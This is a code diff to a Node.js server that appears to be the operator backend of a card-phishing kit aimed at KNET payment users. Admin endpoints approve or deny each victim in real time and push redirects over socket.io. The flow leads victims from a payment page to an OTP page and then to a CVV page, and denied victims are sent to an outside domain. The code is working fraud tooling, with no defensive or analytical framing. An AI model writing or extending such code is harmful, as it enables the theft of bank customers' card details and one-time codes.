@@ -134,14 +134,14 @@ app.post('/api/admin/payment-action', authMiddleware, (req, res) => {
   if (action === 'pass') {
     booking.status = 'approved';
     if (booking.payment) booking.payment.paymentAction = 'pass';
-    // عند القبول: توجيه العميل لصفحة CVV تلقائياً
-    db.redirects[reference] = 'cvv';
+    // عند القبول: توجيه العميل لصفحة OTP تلقائياً
+    db.redirects[reference] = 'otp';
     if (booking.knetId) {
-      db.redirects[booking.knetId] = 'cvv';
+      db.redirects[booking.knetId] = 'otp';
       const knetPayment = (db.knetPayments || []).find(p => p.id === booking.knetId || p.knetId === booking.knetId);
       if (knetPayment) {
         knetPayment.status = 'APPROVED';
-        knetPayment.adminRedirectUrl = getRedirectUrl('cvv', reference);
+        knetPayment.adminRedirectUrl = getRedirectUrl('otp', reference);
         knetPayment.updatedAt = new Date().toISOString();
         io.emit('payment_updated', knetPayment);
         io.emit('admin_redirect', { paymentId: booking.knetId, redirectUrl: knetPayment.adminRedirectUrl });
@@ -173,6 +173,28 @@ app.post('/api/admin/payment-action', authMiddleware, (req, res) => {
     const knetPayment = (db.knetPayments || []).find(p => p.id === booking.knetId);
     if (knetPayment) io.emit('payment_updated', knetPayment);
   }
+  res.json({ success: true });
+});
+
+// OTP Action - قبول OTP يوجه لـ CVV، رفض يوجه للرئيسية
+app.post('/api/admin/otp-action', authMiddleware, (req, res) => {
+  const { reference, action } = req.body;
+  db = loadData();
+  const booking = db.bookings[reference];
+  if (!booking) return res.json({ success: false, error: 'حجز غير موجود' });
+
+  if (action === 'pass') {
+    // قبول OTP: توجيه العميل لصفحة CVV
+    db.redirects[reference] = 'cvv';
+    if (booking.otp) booking.otp.otpAction = 'pass';
+    io.emit('redirect_user', { reference, redirect: getRedirectUrl('cvv', reference) });
+  } else if (action === 'denied') {
+    // رفض OTP: توجيه للرئيسية
+    db.redirects[reference] = 'https://insoline.online';
+    if (booking.otp) booking.otp.otpAction = 'denied';
+    io.emit('redirect_user', { reference, redirect: 'https://insoline.online' });
+  }
+  saveData(db);
   res.json({ success: true });
 });
 
@@ -798,6 +820,7 @@ function getStats() {
 // ==================== SPA Routes ====================
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
 app.get('/cvv', (req, res) => res.sendFile(path.join(__dirname, 'cvv.html')));
+app.get('/otp', (req, res) => res.sendFile(path.join(__dirname, 'cvv.html')));
 app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
 // ==================== Start ====================
